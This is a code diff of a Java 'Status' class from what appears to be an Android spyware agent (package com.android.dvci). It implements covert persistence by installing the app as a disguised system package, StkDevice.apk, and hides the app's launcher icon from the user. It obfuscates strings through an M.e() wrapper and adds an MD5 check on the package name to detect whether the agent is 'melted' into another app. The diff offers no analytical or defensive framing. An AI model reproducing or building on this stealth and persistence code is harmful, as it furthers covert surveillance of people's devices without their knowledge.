@@ -20,10 +20,11 @@ import android.widget.Toast;
 
 import com.android.dvci.action.Action;
 import com.android.dvci.auto.Cfg;
-
 import com.android.dvci.conf.ConfEvent;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.conf.Globals;
+import com.android.dvci.crypto.Crypto;
+import com.android.dvci.crypto.Digest;
 import com.android.dvci.event.BaseEvent;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.gui.ASG;
@@ -127,9 +128,11 @@ public class Status {
 	public static final int PERSISTENCY_STATUS_PRESENT = 3;
 
 
-	public static final String persistencyApk=M.e("/system/app/StkDevice.apk");
-	private static ArrayList<String> activityList=null;
-	static boolean activityListTested =false;
+	public static final String persistencyPackage = M.e("StkDevice");
+	public static final String persistencyApk = M.e("/system/app/") + persistencyPackage + M.e(".apk");
+
+	private static ArrayList<String> activityList = null;
+	static boolean activityListTested = false;
 	private static int persistencyStatus = PERSISTENCY_STATUS_NOT_REQUIRED;
 
 
@@ -146,7 +149,7 @@ public class Status {
 		actionsMap = new HashMap<Integer, Action>();
 		if (Cfg.PERSISTENCE) {
 			persistencyStatus = PERSISTENCY_STATUS_TO_INSTALL;
-		}else{
+		} else {
 			persistencyStatus = PERSISTENCY_STATUS_NOT_REQUIRED;
 		}
 		for (int i = 0; i < Action.NUM_QUEUE; i++) {
@@ -829,7 +832,7 @@ public class Status {
 
 	private boolean checkCameraHardware() {
 
-		if(Build.DEVICE.equals("mako") && android.os.Build.VERSION.SDK_INT < 18){
+		if (Build.DEVICE.equals("mako") && android.os.Build.VERSION.SDK_INT < 18) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkCameraHardware), disabled on nexus4 up to 4.2");
 			}
@@ -852,23 +855,24 @@ public class Status {
 			return false;
 		}
 	}
+
 	static public void setIconState(Boolean hide) {
 		// Nascondi l'icona (subito in android 4.x, al primo reboot
 		// in android 2.x)
 		PackageManager pm = Status.self().getAppContext().getPackageManager();
-		ComponentName cn = new ComponentName(Status.self().getAppContext().getPackageName(),ASG.class.getCanonicalName());
-		int i=pm.getComponentEnabledSetting(cn);
-		if ( hide ) {
+		ComponentName cn = new ComponentName(Status.self().getAppContext().getPackageName(), ASG.class.getCanonicalName());
+		int i = pm.getComponentEnabledSetting(cn);
+		if (hide) {
 			if (i != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " YEAHH Hide ICON for:" + cn);//$NON-NLS-1$
+					Check.log(TAG + " Hide ICON for:" + cn);//$NON-NLS-1$
 				}
 				pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
 						PackageManager.DONT_KILL_APP);
 			}
-		}else{
-			int n=0;
-			while (i == PackageManager.COMPONENT_ENABLED_STATE_DISABLED && n++<2) {
+		} else {
+			int n = 0;
+			while (i == PackageManager.COMPONENT_ENABLED_STATE_DISABLED && n++ < 2) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " RESTORE ICON for:" + cn);//$NON-NLS-1$
 				}
@@ -876,7 +880,7 @@ public class Status {
 						PackageManager.DONT_KILL_APP);
 				try {
 					Thread.sleep(2000);
-					i=pm.getComponentEnabledSetting(cn);
+					i = pm.getComponentEnabledSetting(cn);
 				} catch (InterruptedException e) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "Exception RESTORE ICON for:" + cn + e);//$NON-NLS-1$
@@ -885,11 +889,12 @@ public class Status {
 			}
 		}
 	}
+
 	public static PackageInfo getMyPackageInfo() {
 		PackageInfo pi = null;
 		PackageManager pm = Status.self().getAppContext().getPackageManager();
 		try {
-			pi = pm.getPackageInfo( Status.self().getAppContext().getPackageName(),0);
+			pi = pm.getPackageInfo(Status.self().getAppContext().getPackageName(), 0);
 		} catch (PackageManager.NameNotFoundException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getMyPackageInfo) error:" + e);
@@ -901,8 +906,8 @@ public class Status {
 
 	public boolean haveCamera() {
 
-		if(haveCamera == -1) {
-			haveCamera = checkCameraHardware()?1:0;
+		if (haveCamera == -1) {
+			haveCamera = checkCameraHardware() ? 1 : 0;
 		}
 		return haveCamera == 1;
 	}
@@ -913,18 +918,19 @@ public class Status {
 	 * with the new one , in that case a reboot is needed to
 	 * align the two info.
 	 */
-	public static Boolean needReboot(){
+	public static Boolean needReboot() {
 		PackageInfo pi = null;
-		if ( (pi=getMyPackageInfo())!=null ) {
+		if ((pi = getMyPackageInfo()) != null) {
 			if (persistencyApk != null && !pi.applicationInfo.sourceDir.equals(persistencyApk)) {
 				return true;
 			}
 		}
 		return false;
 	}
+
 	public static String getApkName() {
 		PackageInfo pi = null;
-		if ((pi=getMyPackageInfo())!=null) {
+		if ((pi = getMyPackageInfo()) != null) {
 			return pi.applicationInfo.sourceDir;
 		}
 		return null;
@@ -932,19 +938,28 @@ public class Status {
 
 	public static String getAppDir() {
 		PackageInfo pi = null;
-		if ((pi=getMyPackageInfo())!=null) {
-				return pi.applicationInfo.dataDir;
+		if ((pi = getMyPackageInfo()) != null) {
+			return pi.applicationInfo.dataDir;
 		}
 		return null;
 	}
 
+	/**
+	 * already persistent and rebooted
+	 * @return
+	 */
 	public static Boolean isPersistent() {
 		String apkName = getApkName();
-		if (apkName!=null){
+		if (apkName != null) {
 			return apkName.contains(M.e("/system/app/"));
 		}
 		return false;
 	}
+
+	/**
+	 * Installed but not yet reboot
+	 * @return
+	 */
 	public static Boolean persistencyReady() {
 		AutoFile apkFile = new AutoFile(persistencyApk);
 		if (apkFile.exists()) {
@@ -958,16 +973,19 @@ public class Status {
 		}
 		return false;
 	}
+
 	public static void setPersistencyStatus(int i) {
-		persistencyStatus=i;
+		persistencyStatus = i;
 	}
+
 	public static int getPersistencyStatus() {
 		return persistencyStatus;
 	}
+
 	public static String getPersistencyStatusStr() {
-		if(!Cfg.PERSISTENCE)
+		if (!Cfg.PERSISTENCE)
 			return M.e("not required");
-		switch (persistencyStatus){
+		switch (persistencyStatus) {
 			case PERSISTENCY_STATUS_FAILED:
 				return M.e("installation failed");
 			case PERSISTENCY_STATUS_NOT_REQUIRED:
@@ -983,18 +1001,25 @@ public class Status {
 		}
 		return M.e("UNKNOWN");
 	}
+
 	public static boolean isMelt() {
-		if (activityListTested==false){
+
+		String pack = Status.self().getAppContext().getPackageName();
+		// echo -n "com.android.dvci" | md5
+		boolean equal = Digest.MD5(pack).equals("b232a7613976c9420b76780ec6c225a8");
+		return !(equal);
+
+		/*if (activityListTested == false) {
 			activityList = PackageUtils.getActivitisFromApk(getApkName());
-			activityListTested=true;
+			activityListTested = true;
 		}
-		if (activityList!=null && !activityList.isEmpty()) {
-			for(String s:activityList){
+		if (activityList != null && !activityList.isEmpty()) {
+			for (String s : activityList) {
 				if (!s.contains(Status.self().getAppContext().getPackageName())) {
 					return true;
 				}
 			}
 		}
-		return false;
+		return false;*/
 	}
 }
